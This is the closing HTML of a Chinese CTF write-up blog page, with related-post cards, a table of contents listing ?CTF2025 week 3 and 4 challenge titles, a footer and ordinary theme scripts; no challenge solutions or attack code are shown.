"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://files.buuoj.cn/files/af4ab817bcd19b8b3618173239af6c0c/11111.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-25</div><div class="title">DASCTF</div></div></a></div><div><a href="/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/" title="2024春秋杯网络安全联赛夏季赛"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/%E5%B0%81%E9%9D%A2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-07</div><div class="title">2024春秋杯网络安全联赛夏季赛</div></div></a></div><div><a href="/BeginCTF/" title="BeginCTF WP"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./BeginCTF/%E5%B0%81%E9%9D%A2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-06</div><div class="title">BeginCTF WP</div></div></a></div><div><a href="/HZNUCTF/" title="HZNUCTF"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./HZNUCTF/%E5%B0%81%E9%9D%A2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-15</div><div class="title">HZNUCTF</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/chenxi.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">晨曦</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Week3-%E9%AD%94%E6%9C%AF%E5%A4%A7%E6%9D%82%E7%83%A9"><span class="toc-number">1.1.</span> <span class="toc-text">[Week3] 魔术大杂烩</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week3-%E8%BF%99%E5%8F%88%E6%98%AF%E4%BB%80%E4%B9%88%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">[Week3] 这又是什么函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week3-%E6%9F%A5%E6%9F%A5%E5%BF%86"><span class="toc-number">1.3.</span> <span class="toc-text">[Week3] 查查忆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week3-VIP"><span class="toc-number">1.4.</span> <span class="toc-text">[Week3] VIP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week4-Path-to-Hero"><span class="toc-number">1.5.</span> <span class="toc-text">[Week4] Path to Hero</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week4-%E6%9D%A5getshell-%E9%80%9F%E5%BA%A6"><span class="toc-number">1.6.</span> <span class="toc-text">[Week4] 来getshell 速度!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week4-%E8%BF%99%E5%8F%88%E5%8F%88%E6%98%AF%E4%BB%80%E4%B9%88%E5%87%BD%E6%95%B0"><span class="toc-number">1.7.</span> <span class="toc-text">[Week4] 这又又是什么函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week4-%E5%A5%BD%E5%83%8F%E4%BB%80%E4%B9%88%E9%83%BD%E8%83%BD%E8%AF%BB"><span class="toc-number">1.8.</span> <span class="toc-text">[Week4] 好像什么都能读</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week4-android-or-apple"><span class="toc-number">1.9.</span> <span class="toc-text">[Week4] android or apple</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week4-waf-waf"><span class="toc-number">1.10.</span> <span class="toc-text">[Week4] waf?waf!</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Re"><span class="toc-number">2.</span> <span class="toc-text">Re</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Week3-wtf"><span class="toc-number">2.1.</span> <span class="toc-text">[Week3] wtf</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Week3-%E6%96%87%E5%8C%96%E6%9C%A8%E7%9A%84%E4%BE%A6%E6%8E%A2%E5%A7%94%E6%89%98-%E4%B8%89"><span class="toc-number">3.1.</span> <span class="toc-text">[Week3] 文化木的侦探委托(三)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week3-%E4%BF%B1%E4%B9%90%E9%83%A8%E4%B9%8B%E6%97%85-3-%E4%B8%8E%E6%97%B6%E9%97%B4%E5%AF%B9%E8%AF%9D"><span class="toc-number">3.2.</span> <span class="toc-text">[Week3] 俱乐部之旅(3) - 与时间对话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week3-%E5%B8%83%E8%B1%AA%E6%9C%89%E9%BB%91%E5%AE%A2-%E4%B8%89"><span class="toc-number">3.3.</span> <span class="toc-text">[Week3] 布豪有黑客(三)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week3-%E3%80%8A%E5%85%B3%E4%BA%8E%E6%88%91%E7%A9%BF%E8%B6%8A%E5%88%B0CTF%E7%9A%84%E5%BC%82%E4%B8%96%E7%95%8C%E8%BF%99%E6%A1%A3%E4%BA%8B-Q%E3%80%8B"><span class="toc-number">3.4.</span> <span class="toc-text">[Week3] 《关于我穿越到CTF的异世界这档事:Q》</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week4-%E3%80%8A%E5%85%B3%E4%BA%8E%E6%88%91%E7%A9%BF%E8%B6%8A%E5%88%B0CTF%E7%9A%84%E5%BC%82%E4%B8%96%E7%95%8C%E8%BF%99%E6%A1%A3%E4%BA%8B-%E7%BB%88%E3%80%8B"><span class="toc-number">3.5.</span> <span class="toc-text">[Week4] 《关于我穿越到CTF的异世界这档事:终》</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week4-%E4%BF%B1%E4%B9%90%E9%83%A8%E4%B9%8B%E6%97%85-4-%E5%BD%A9%E8%9B%8B"><span class="toc-number">3.6.</span> <span class="toc-text">[Week4] 俱乐部之旅(4) - 彩蛋</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week4-%E6%96%87%E5%8C%96%E6%9C%A8%E7%9A%84%E4%BE%A6%E6%8E%A2%E5%A7%94%E6%89%98-%E5%9B%9B"><span class="toc-number">3.7.</span> <span class="toc-text">[Week4] 文化木的侦探委托(四)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week4-%E5%B8%83%E8%B1%AA%E6%9C%89%E9%BB%91%E5%AE%A2-%E5%9B%9B"><span class="toc-number">3.8.</span> <span class="toc-text">[Week4] 布豪有黑客(四)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ai"><span class="toc-number">4.</span> <span class="toc-text">Ai</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Week3-%E7%AD%89%E4%B8%8B%E4%BA%A4%E4%B8%AAflag%E5%85%88"><span class="toc-number">4.1.</span> <span class="toc-text">[Week3] 等下交个flag先</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week3-browser-mcp"><span class="toc-number">4.2.</span> <span class="toc-text">[Week3] browser-mcp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">5.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Week3-BackPack"><span class="toc-number">5.1.</span> <span class="toc-text">[Week3] BackPack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week3-Great-Block-Cipher"><span class="toc-number">5.2.</span> <span class="toc-text">[Week3] Great Block Cipher</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week3-%E7%B2%97%E5%BF%83%E7%9A%84%E5%88%80%E5%AE%A2%E5%A1%94"><span class="toc-number">5.3.</span> <span class="toc-text">[Week3] 粗心的刀客塔</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week3-my-crypto"><span class="toc-number">5.4.</span> <span class="toc-text">[Week3] my crypto</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week3-%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95"><span class="toc-number">5.5.</span> <span class="toc-text">[Week3] 期末考试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week4-Xaleid%E2%97%86scopiX"><span class="toc-number">5.6.</span> <span class="toc-text">[Week4] Xaleid◆scopiX</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week4-Myneighbors"><span class="toc-number">5.7.</span> <span class="toc-text">[Week4] Myneighbors</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week4-linear-function"><span class="toc-number">5.8.</span> <span class="toc-text">[Week4] linear function?</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/%EF%BC%9FCTF2025_week3&amp;week4_WP/" title="?CTF2025_week3&amp;week4_WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&amp;week4_WP/%E5%B0%81%E9%9D%A2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="?CTF2025_week3&amp;week4_WP"/></a><div class="content"><a class="title" href="/%EF%BC%9FCTF2025_week3&amp;week4_WP/" title="?CTF2025_week3&amp;week4_WP">?CTF2025_week3&amp;week4_WP</a><time datetime="2025-11-04T09:00:00.000Z" title="发表于 2025-11-04 17:00:00">2025-11-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%EF%BC%9FCTF2025_week1&amp;week2_WP/" title="?CTF2025_week1&amp;week2_WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&amp;week2_WP/%E5%B0%81%E9%9D%A2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="?CTF2025_week1&amp;week2_WP"/></a><div class="content"><a class="title" href="/%EF%BC%9FCTF2025_week1&amp;week2_WP/" title="?CTF2025_week1&amp;week2_WP">?CTF2025_week1&amp;week2_WP</a><time datetime="2025-10-21T11:20:34.000Z" title="发表于 2025-10-21 19:20:34">2025-10-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025H&amp;NCTF_WP/" title="2025H&amp;NCTF WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./2025H&amp;NCTF/%E5%B0%81%E9%9D%A2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025H&amp;NCTF WP"/></a><div class="content"><a class="title" href="/2025H&amp;NCTF_WP/" title="2025H&amp;NCTF WP">2025H&amp;NCTF WP</a><time datetime="2025-06-08T08:05:00.000Z" title="发表于 2025-06-08 16:05:00">2025-06-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/" title="ctfshow元旦杯_WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/%E5%B0%81%E9%9D%A2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow元旦杯_WP"/></a><div class="content"><a class="title" href="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/" title="ctfshow元旦杯_WP">ctfshow元旦杯_WP</a><time datetime="2025-01-06T13:25:34.000Z" title="发表于 2025-01-06 21:25:34">2025-01-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E8%9C%80%E9%81%93%E5%B1%B1/" title="蜀道山"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./%E8%9C%80%E9%81%93%E5%B1%B1/%E5%B0%81%E9%9D%A2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蜀道山"/></a><div class="content"><a class="title" href="/%E8%9C%80%E9%81%93%E5%B1%B1/" title="蜀道山">蜀道山</a><time datetime="2024-11-18T04:33:00.000Z" title="发表于 2024-11-18 12:33:00">2024-11-18</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/%EF%BC%9FCTF2025_week3&amp;week4_WP/%E5%B0%81%E9%9D%A2.jpg')"><div id="footer-wrap"><div id="ft"></div><div class="copyright"><span><b>&copy;2023 - 2025</b></span><span><b>&nbsp;&nbsp;By 晨曦</b></span></div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" title="博客框架为Hexo_v6.3.0"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Frame-Hexo-blue.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" title="主题版本Butterfly_v4.3.1"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Theme-Butterfly-6513df.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" title="本站采用多线部署，主线路托管于Vercel"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Hosted-Vercel-brightgreen.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://user.51.la/" style="margin-inline:5px" title="本站数据分析得益于51la技术支持"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Analytics-51la-3db1eb.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://icp.gov.moe/?keyword=20226665" style="margin-inline:5px" title="本站已加入萌ICP豪华套餐，萌ICP备20226665号"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/萌ICP备-20226665-fe1384.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://bitiful.dogecast.com/buckets" style="margin-inline:5px" title="本网站经Service Worker分流至缤纷云对象存储"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src=" https://sourcebucket.s3.ladydaily.com/badge/Bucket-缤纷云-9c62da.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://www.netdun.net/" style="margin-inline:5px" title="本站使用网盾星球提供CDN加速与防护"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/CDN-网盾星球-fff2cc.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" title="本网站源码由Github提供存储仓库"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src=" https://sourcebucket.s3.ladydaily.com/badge/Source-Github-d021d6.svg" alt=""/></a></p></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(()=>{
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://chenxi-api.vercel.app/',
      region: '',
      onCommentLoaded: function () {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://chenxi-api.vercel.app/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(function (res) {
      countELement.innerText = res[0].count
    }).catch(function (err) {
      console.error(err);
    });
  }

  const runFn = () => {
    init()
    
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') {
      setTimeout(runFn,0)
      return
    } 
    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = () => {
      loadTwikoo()
    }
  }
})()</script></div><script defer src="/live2d-widget-master/autoload.js"></script><script src="/js/lunar.js"></script><script src="/js/day.js"></script><script type="text/javascript" src="/js/FunnyTitle.js"></script><script type="text/javascript" src="https://cdn1.tianli0.top/npm/sweetalert2@8.19.0/dist/sweetalert2.all.js"></script><script defer src="https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js"></script><script data-pjax defer src="https://npm.elemecdn.com/tzy-blog/lib/js/theme/chocolate.js"></script><script src="/js/jquery.js"></script><script type="text/javascript" src="/js/click.js"></script><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js"></script><script defer data-pjax src="/js/cat.js"></script><script defer src="/js/runtime.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></body></html>